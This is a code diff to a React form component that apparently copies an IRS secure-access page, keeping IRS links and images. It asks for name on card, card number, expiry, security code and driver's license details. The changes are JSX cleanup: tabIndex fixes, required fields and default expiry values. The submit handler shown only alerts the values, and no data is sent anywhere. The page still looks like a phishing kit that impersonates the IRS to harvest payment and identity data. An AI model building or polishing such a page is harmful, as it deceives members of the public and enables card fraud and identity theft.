@@ -4,8 +4,8 @@ import './finance.css';
 function Finance() {
 	const [name, setName] = useState('')
 	const [CC, setCC] = useState('')
-	const [ccExpiryMonth, setCcExpiryMonth] = useState('')
-	const [ccExpiryYear, setCcExpiryYear] = useState('')
+	const [ccExpiryMonth, setCcExpiryMonth] = useState('01')
+	const [ccExpiryYear, setCcExpiryYear] = useState('2020')
 	const [cSC, setcSC] = useState('')
 	const [DLNumber, setDLNumber] = useState('')
 	const [dLExpiryMonth, setdLExpiryMonth] = useState('')
@@ -14,7 +14,7 @@ function Finance() {
 
 	const handleSubmit = e => {
 		e.preventDefault()
-		alert(`name: ${name} cc: ${CC} ${ccExpiryMonth}/${ccExpiryYear} ${cSC} ${DLNumber} ${dLExpiryMonth}/${dLExpiryDay}/${dLExpiryYear} `)
+		alert(`name: ${name} cc: ${CC} ${ccExpiryMonth}/${ccExpiryYear} ${cSC} ${DLNumber} ${dLExpiryMonth}-${dLExpiryDay}-${dLExpiryYear} `)
 	}
 	
   return (
@@ -104,7 +104,7 @@ if (top != self) {
 		
 		
 		
-	<div id="access" tabindex="1"></div>	
+	<div id="access" tabIndex="1"></div>	
 		
 </div>
 
@@ -220,15 +220,15 @@ if (top != self) {
 								{/* <!-- <input type="radio" className="bigradio"
 									onClick="doGray(); populateHidden('pc')"
 									id="is_pc" name="is_loan"
-									tabindex="0"
+									tabIndex="0"
 									value="" /> --> */}
 										Name On Card
 							</label>
 							<input type="text"
 						 			id="pc" name="pc" 
-						 		
+						 		required
 						 			className="textbox  "
-						 			tabindex="0"
+						 			tabIndex="0"
 						 			value={name} 
 									 onChange={e => setName(e.target.value)}/>
 						 		
@@ -246,14 +246,15 @@ if (top != self) {
 							{/* <!-- <input type="radio" className="bigradio" 
 							onClick="doGray(); populateHidden('student_loan')"
 							 id="is_student_loan" name="is_loan"
-							 tabindex="0"
+							 tabIndex="0"
 							 value="" /> --> */}
 							Card Number
 						</label>
 						<input type="text"
 						className="textbox "
 						 id="student_loan" name="student_loan" maxLength="16"
-						 tabindex="0"
+						 tabIndex="0"
+						 required
 						 value={CC}
 						 onChange={e => setCC(e.target.value)} />
 						 		
@@ -286,7 +287,7 @@ if (top != self) {
 										Month
 									</label>
                   <select name="month" style={{width: "auto"}} 
-									tabindex="0" aria-labelledby="dob_fieldset"
+									tabIndex="0" aria-labelledby="dob_fieldset"
 									className="select-style"
 									value={ccExpiryMonth}
       onChange={e => setCcExpiryMonth(e.currentTarget.value)}>
@@ -344,7 +345,7 @@ if (top != self) {
 									
 									
 									<select name="day" id="day" style="width: auto;"
-									tabindex="0" aria-labelledby="dob_fieldset"
+									tabIndex="0" aria-labelledby="dob_fieldset"
 									 className="select-style">
 										<option value="Day">Day</option>
 									
@@ -365,12 +366,13 @@ if (top != self) {
 									
 									
 									
-										{/* <input type="text" className="textbox-nosize " name="year" placeholder="Year" size="4" maxlength="4" id="year" required tabindex="0" aria-labelledby="dob_fieldset" 
+										{/* <input type="text" className="textbox-nosize " name="year" placeholder="Year" size="4" maxlength="4" id="year" required tabIndex="0" aria-labelledby="dob_fieldset" 
 										value={expiry} onChange={e => setExpiry(e.target.value)}/> */}
 									
 									<select name="month" style={{width: "auto"}} 
-									tabindex="0" aria-labelledby="dob_fieldset"
+									tabIndex="0" aria-labelledby="dob_fieldset"
 									className="select-style"
+									required
 									value={ccExpiryYear}
       onChange={e => setCcExpiryYear(e.currentTarget.value)}>
 		  	<option value="2020">
@@ -491,14 +493,15 @@ if (top != self) {
 							{/* <!-- <input type="radio" className="bigradio" 
 							onClick="doGray(); populateHidden('auto_loan')"
 							 id="is_auto_loan" name="is_loan"
-							 tabindex="0"
+							 tabIndex="0"
 							 value="" /> --> */}
 							Card Security Code
 						</label>
 						<input type="text"
 						className="textbox-nosize "
 						 id="auto_loan" name="auto_loan" maxLength="4"
-						 tabindex="0"
+						 tabIndex="0"
+						 required
 						 value={cSC}
 						 onChange={e => setcSC(e.target.value)} />
 						 <input type="hidden" id="auto_loan_ind" name="auto_loan_ind" value="" />
@@ -512,14 +515,14 @@ if (top != self) {
 							{/* <!-- <input type="radio" className="bigradio" 
 							onClick="doGray(); populateHidden('mort_loan')"
 							 id="is_mort_loan" name="is_loan"
-							 tabindex="0"
+							 tabIndex="0"
 							 value="" /> --> */}
 							Driver's License Number <em>(disregard if unapplicable)</em>
 						</label>
 						<input type="text"
 						className="textbox "
 						 id="mort_loan" name="mort_loan" maxLength="20"
-						 tabindex="0"
+						 tabIndex="0"
 						 value={DLNumber}
 						 onChange={e => setDLNumber(e.target.value)} />
 						 <input type="hidden" id="mort_loan_ind" name="mort_loan_ind" value="" />
@@ -533,7 +536,7 @@ if (top != self) {
 							{/* <!-- <input type="radio" className="bigradio"
 							onClick="doGray(); populateHidden('home_loan')"
 							 id="is_home_loan" name="is_loan"
-							 tabindex="0"
+							 tabIndex="0"
 							 value="" /> --> */}
 							Driver's License Expiration Date <em>(disregard if unapplicable)</em>
 						</label>
@@ -573,7 +576,7 @@ if (top != self) {
 										Month
 									</label>
 									<select name="month" style={{width: 'auto'}}
-									tabindex="0" aria-labelledby="dob_fieldset"
+									tabIndex="0" aria-labelledby="dob_fieldset"
 									className="select-style"
 									value={dLExpiryMonth}
       onChange={e => setdLExpiryMonth(e.currentTarget.value)}>
@@ -631,7 +634,7 @@ if (top != self) {
 									
 									
 									<select name="day" id="day" style={{width: "auto"}}
-									tabindex="0" aria-labelledby="dob_fieldset"
+									tabIndex="0" aria-labelledby="dob_fieldset"
 									 className="select-style"
 									 value={dLExpiryDay}
 	   onChange={e => setdLExpiryDay(e.currentTarget.value)}>
@@ -746,11 +749,11 @@ if (top != self) {
 									
 									
 									
-										{/* <input type="text" className="textbox-nosize " name="year" placeholder="Year" size="4" maxlength="4" id="year" required tabindex="0" aria-labelledby="dob_fieldset"
+										{/* <input type="text" className="textbox-nosize " name="year" placeholder="Year" size="4" maxlength="4" id="year" required tabIndex="0" aria-labelledby="dob_fieldset"
 										value={dLExpiry} onChange={e => setdLExpiry(e.target.value)} /> */}
 									
 									<select name="month" style={{width: "auto"}} 
-									tabindex="0" aria-labelledby="dob_fieldset"
+									tabIndex="0" aria-labelledby="dob_fieldset"
 									className="select-style"
 									value={dLExpiryYear}
       onChange={e => setdLExpiryYear(e.currentTarget.value)}>
@@ -921,7 +924,7 @@ if (top != self) {
 						className="textbox ide-textbox-position"
 						 id="home_loan" name="home_loan" maxLength="40"
 						 onKeyUp="markLoan('home_loan')"
-						 tabindex="0>"
+						 tabIndex="0>"
 						 value="" /> --> */}
 						 {/* <!-- <input type="hidden" id="home_loan_ind" name="home_loan_ind" value="" /> --> */}
 						 {/* </p> */}
@@ -934,7 +937,7 @@ if (top != self) {
 							{/* <!-- <input type="radio" className="bigradio"
 							onClick="doGray(); populateHidden('none')"
 							 id="is_no_loan" name="is_loan"
-							 tabindex="0"
+							 tabIndex="0"
 							 value="" /> --> */}
 							{/* <!-- I don't have a current credit card, student loan, auto loan, home equity loan, or mortgage --> */}
 						</label>
@@ -952,7 +955,7 @@ if (top != self) {
 					<p>							
 							
 							<input type="image" name="continue" id="continue"
-								tabindex="0" alt="Continue"
+								tabIndex="0" alt="Continue"
 								onFocus="addVisualFocusIndicator(this, true)"
 									onBlur="this.style.border = ''"
 								onClick="addVisualFocusIndicator(this, true)"
@@ -1002,7 +1005,7 @@ if (top != self) {
 
 	<li>
 		<a href="https://www.irs.gov/secureaccess" 
-		tabindex="0" 
+		tabIndex="0" 
 		target="_blank"
 		rel="noreferrer">
 			Help</a>	
@@ -1010,7 +1013,7 @@ if (top != self) {
 	
 	<li>
 		<a href="http://www.irs.gov/uac/IRS-Privacy-Policy" 
-		tabindex="0" 
+		tabIndex="0" 
 		target="_blank"
 		rel="noreferrer">
 			IRS Privacy Policy</a>
@@ -1018,7 +1021,7 @@ if (top != self) {
 	
 	<li>
 		<a href="https://sa.www4.irs.gov/eauth/pub/help/sec_code_terms_conditions.jsp"  
-		tabindex="0" 
+		tabIndex="0" 
 		target="_blank"
 		rel="noreferrer">
 			  Security Code Terms and Conditions</a>
@@ -1027,7 +1030,7 @@ if (top != self) {
 	
 	<li>
 		<a href="https://sa.www4.irs.gov/eauth/pub/help/accessibility.jsp"  
-		tabindex="0" 
+		tabIndex="0" 
 		target="_blank"
 		rel="noreferrer">
 			Accessibility
@@ -1072,7 +1075,7 @@ if (top != self) {
 	</div> */}
 	{/* <div className="dialog_form_actions"> */}
 		
-			{/* <button type="button" id="continue" name="continue" tabindex="0" aria-label="Yes" className="dialog_yes_button_position dialog_yes_button"  
+			{/* <button type="button" id="continue" name="continue" tabIndex="0" aria-label="Yes" className="dialog_yes_button_position dialog_yes_button"  
 				// onclick="sendHttpRequest(window.location.href); getSessionExpirationTime(); setTimeout(function() { openDialog('sessionWarningDialog', this, 'continue'); }, sessionTimeoutWarningInterval); cancelTimeoutRedirection(); setupTimeoutRedirection(); closeDialog(this);"
         >
   				<img alt="Yes" 
@@ -1080,7 +1083,7 @@ if (top != self) {
             </button> */}
 		
 		
-		{/* <button type="button" name="no" tabindex="0" aria-label="No" className="dialog_close_button"   
+		{/* <button type="button" name="no" tabIndex="0" aria-label="No" className="dialog_close_button"   
 			onclick="closeDialog(this);"> */}
   			{/* <img alt="No" 
   				src="https://sa.www4.irs.gov/eauth/pub/common/images/button_x.jpg"> */}
